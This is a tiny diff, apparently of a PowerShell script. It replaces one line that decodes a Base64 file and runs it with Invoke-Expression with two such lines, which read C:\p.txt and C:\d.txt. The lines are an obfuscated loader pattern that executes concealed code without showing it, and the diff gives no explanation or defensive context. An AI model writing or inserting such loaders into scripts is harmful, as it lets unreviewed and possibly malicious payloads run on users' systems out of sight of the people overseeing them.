@@ -1,1 +1,2 @@
-iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content C:\l.txt -Raw))))
+iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content "C:\p.txt" -Raw))))
+iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content "C:\d.txt" -Raw))))
